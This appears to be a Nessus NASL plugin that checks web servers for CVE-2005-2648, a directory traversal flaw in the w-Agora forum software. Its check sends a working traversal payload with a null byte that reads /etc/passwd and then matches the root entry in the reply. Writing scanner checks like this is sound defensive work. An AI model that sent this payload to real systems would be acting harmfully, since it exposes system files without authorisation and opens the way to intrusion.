#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref:  matrix_killer
#
# This script is released under the GNU GPLv2
#
# Fixes by Tenable:
#   - added CVE xref.

if (description) {
script_id(19474);
script_cve_id("CVE-2005-2648");
script_bugtraq_id(14597);
script_version("$Revision: 1.4 $");

name["english"] = "w-Agora Site parameter remote directory traversal flaw";
script_name(english:name["english"]);

desc["english"] = "
The remote host is running w-agora, a web-based forum management software
written in PHP.

The remote version of this software is prone to directory traversal attacks.
An attacker could send specially crafted URL to read arbitrary files on
the remote system with the privileges of the web server process.

Solution : Upgrade to the newest version of this software
Risk factor : Medium";

script_description(english:desc["english"]);

summary["english"] = "Checks for directory traversal in w-Agora";
script_summary(english:summary["english"]);

script_category(ACT_GATHER_INFO);
script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");

family["english"] = "CGI abuses";
script_family(english:family["english"]);

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir ( cgi_dirs() )
{
  req = string(dir, "/index.php?site=../../../../../../../../etc/passwd%00");
  req = http_get(item:req, port:port);
  result = http_keepalive_send_recv(port:port, data:req);
  if(result == NULL) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
}
